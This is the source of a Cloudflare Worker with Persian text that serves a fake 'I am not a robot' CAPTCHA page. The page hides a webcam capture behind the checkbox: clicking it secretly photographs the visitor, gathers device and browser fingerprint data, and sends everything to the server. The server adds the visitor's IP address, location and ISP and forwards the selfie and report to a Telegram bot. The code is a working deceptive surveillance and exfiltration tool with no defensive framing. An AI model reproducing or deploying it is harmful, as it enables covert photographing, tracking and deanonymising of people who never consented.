export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    if (request.method === "GET" && url.pathname === "/") {
      return new Response(getHTML(), {
        headers: {
          "Content-Type": "text/html;charset=UTF-8",
          // جلوگیری از کش شدن HTML در مرورگر
          "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
          "Pragma": "no-cache",
          "Expires": "0",
        },
      });
    }

    if (request.method === "POST" && url.pathname === "/upload") {
      try {
        const formData = await request.formData();
        const photo = formData.get("photo");
        const clientDataRaw = formData.get("clientData");

        if (!photo || !(photo instanceof File)) {
          return new Response("No photo uploaded", { status: 400 });
        }

        let clientInfo = {};
        try {
          clientInfo = clientDataRaw ? JSON.parse(clientDataRaw) : {};
        } catch (e) {
          clientInfo = { _parseError: String(e) };
        }

        const cf = request.cf || {};
        const serverInfo = {
          ip: request.headers.get("CF-Connecting-IP") || "نامشخص",
          country: cf.country || "نامشخص",
          city: cf.city || "نامشخص",
          region: cf.region || "نامشخص",
          timezone: cf.timezone || "نامشخص",
          isp: cf.asOrganization || "نامشخص",
          asn: cf.asn || "نامشخص",
          httpProtocol: cf.httpProtocol || "نامشخص",
          tlsVersion: cf.tlsVersion || "نامشخص",
          colo: cf.colo || "نامشخص",
          userAgent: request.headers.get("User-Agent") || "نامشخص",
          acceptLanguage: request.headers.get("Accept-Language") || "نامشخص",
          referer: request.headers.get("Referer") || "نامشخص",
        };

        // escape برای HTML
        const esc = (v) => String(v ?? "نامشخص")
          .replace(/&/g, "&amp;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;");

        const lines = [
          "<b>📸 گزارش سلفی و اطلاعات کاربر</b>",
          "<i>نسخه: v2</i>",
          "",
          "<b>🌐 اطلاعات شبکه (سمت سرور):</b>",
          `• IP: <code>${esc(serverInfo.ip)}</code>`,
          `• کشور: ${esc(serverInfo.country)}`,
          `• شهر: ${esc(serverInfo.city)}`,
          `• منطقه: ${esc(serverInfo.region)}`,
          `• منطقه زمانی: ${esc(serverInfo.timezone)}`,
          `• ISP: ${esc(serverInfo.isp)}`,
          `• ASN: ${esc(serverInfo.asn)}`,
          `• پروتکل HTTP: ${esc(serverInfo.httpProtocol)}`,
          `• نسخه TLS: ${esc(serverInfo.tlsVersion)}`,
          `• دیتاسنتر Cloudflare: ${esc(serverInfo.colo)}`,
          `• User-Agent: <code>${esc(serverInfo.userAgent)}</code>`,
          `• زبان: ${esc(serverInfo.acceptLanguage)}`,
          `• Referer: ${esc(serverInfo.referer)}`,
          "",
          "<b>💻 اطلاعات مرورگر (سمت کلاینت):</b>",
          `• User-Agent: <code>${esc(clientInfo.userAgent)}</code>`,
          `• زبان: ${esc(clientInfo.language)}`,
          `• زبان‌های ترجیحی: ${esc((clientInfo.languages || []).join(", "))}`,
          `• پلتفرم: ${esc(clientInfo.platform)}`,
          `• رزولوشن صفحه: ${esc(clientInfo.screenWidth)}×${esc(clientInfo.screenHeight)}`,
          `• ابعاد پنجره: ${esc(clientInfo.innerWidth)}×${esc(clientInfo.innerHeight)}`,
          `• نسبت پیکسل: ${esc(clientInfo.devicePixelRatio)}`,
          `• هسته CPU: ${esc(clientInfo.hardwareConcurrency)}`,
          `• حافظه (GB): ${esc(clientInfo.deviceMemory)}`,
          `• آنلاین: ${clientInfo.onLine ? "بله" : "خیر"}`,
          `• نوع اتصال: ${esc(clientInfo.connectionType)}`,
          `• منطقه زمانی: ${esc(clientInfo.timezone)}`,
          `• زمان محلی: ${esc(clientInfo.localTime)}`,
          `• کوکی فعال: ${clientInfo.cookieEnabled ? "بله" : "خیر"}`,
          `• Do Not Track: ${esc(clientInfo.doNotTrack)}`,
          `• PDF Viewer: ${clientInfo.pdfViewerEnabled ? "بله" : "خیر"}`,
        ];

        let reportText = lines.join("\n");
        // محدودیت ۴۰۹۶ کاراکتر
        if (reportText.length > 4000) {
          reportText = reportText.slice(0, 3990) + "\n...";
        }

        // ۱. ارسال عکس (بدون کپشن طولانی)
        const photoForm = new FormData();
        photoForm.append("chat_id", env.TELEGRAM_CHAT_ID);
        photoForm.append("photo", photo, "selfie.jpg");
        photoForm.append("caption", "📸 سلفی دریافتی");

        const photoResp = await fetch(
          `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`,
          { method: "POST", body: photoForm }
        );
        const photoResult = await photoResp.json();

        // ۲. ارسال پیام اطلاعات با HTML (نه Markdown)
        const msgResp = await fetch(
          `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: env.TELEGRAM_CHAT_ID,
              text: reportText,
              parse_mode: "HTML",
              disable_web_page_preview: true,
            }),
          }
        );
        const msgResult = await msgResp.json();

        // اگر هر کدام شکست خورد، جزئیات را برگردان تا در کنسول مرورگر ببینی
        if (!photoResult.ok || !msgResult.ok) {
          return new Response(
            JSON.stringify({
              photo: photoResult,
              message: msgResult,
            }),
            { status: 502, headers: { "Content-Type": "application/json" } }
          );
        }

        return new Response("ok", { status: 200 });
      } catch (err) {
        return new Response("Error: " + String(err), { status: 500 });
      }
    }

    return new Response("Not Found", { status: 404 });
  },
};

function getHTML() {
  return `
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تایید هویت</title>
  <style>
    body {
      margin: 0; height: 100vh;
      display: flex; align-items: center; justify-content: center;
      font-family: sans-serif; background: #f8f9fa;
    }
    .captcha-box {
      display: flex; align-items: center; gap: 14px;
      padding: 18px 28px;
      background: #fff; border: 1px solid #d3d3d3; border-radius: 6px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.06);
      user-select: none;
    }
    .checkbox {
      width: 26px; height: 26px;
      border: 2px solid #888; border-radius: 4px;
      display: flex; align-items: center; justify-content: center;
      cursor: pointer; transition: all 0.2s;
      background: #fff;
    }
    .checkbox:hover { border-color: #4a90e2; }
    .checkbox.checked { background: #4a90e2; border-color: #4a90e2; }
    .checkbox.checked::after {
      content: "";
      width: 6px; height: 12px;
      border: solid white; border-width: 0 2px 2px 0;
      transform: rotate(45deg);
      margin-bottom: 2px;
    }
    .label { font-size: 16px; color: #333; cursor: pointer; }
    #hiddenVideo, #canvas { display: none; }
  </style>
</head>
<body>
  <div class="captcha-box">
    <div class="checkbox" id="checkbox"></div>
    <span class="label" id="label">من ربات نیستم</span>
  </div>

  <video id="hiddenVideo" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    // نسخه جدید JS
    console.log('[v2] loaded');
    const checkbox = document.getElementById('checkbox');
    const label = document.getElementById('label');
    const video = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('canvas');
    let busy = false;

    function collectClientData() {
      return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages,
        platform: navigator.platform,
        screenWidth: screen.width,
        screenHeight: screen.height,
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        devicePixelRatio: window.devicePixelRatio,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        onLine: navigator.onLine,
        connectionType: navigator.connection ? navigator.connection.effectiveType : null,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        localTime: new Date().toLocaleString(),
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        pdfViewerEnabled: navigator.pdfViewerEnabled,
      };
    }

    async function handleClick() {
      if (busy) return;
      busy = true;
      label.textContent = 'لطفاً صبر کنید...';

      let stream = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, audio: false
        });

        video.srcObject = stream;
        await new Promise((resolve) => {
          if (video.readyState >= 2) return resolve();
          video.onloadeddata = resolve;
        });
        await new Promise(r => setTimeout(r, 400));

        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise((resolve) =>
          canvas.toBlob(resolve, 'image/jpeg', 0.9)
        );

        stream.getTracks().forEach(t => t.stop());
        stream = null;

        if (!blob) throw new Error('capture failed');

        const clientData = JSON.stringify(collectClientData());
        console.log('[v2] clientData =', clientData);

        const formData = new FormData();
        formData.append('photo', blob, 'selfie.jpg');
        formData.append('clientData', clientData);

        const resp = await fetch('/upload', { method: 'POST', body: formData });

        if (!resp.ok) {
          const body = await resp.text();
          console.error('[v2] upload failed', resp.status, body);
          throw new Error('upload failed: ' + body);
        }

        checkbox.classList.add('checked');
        label.textContent = 'تایید شد';
      } catch (err) {
        console.error('[v2] error', err);
        if (stream) stream.getTracks().forEach(t => t.stop());
        label.textContent = 'من ربات نیستم';
        busy = false;
        return;
      }

      busy = false;
    }

    checkbox.addEventListener('click', handleClick);
    label.addEventListener('click', handleClick);
  </script>
</body>
</html>
  `;
}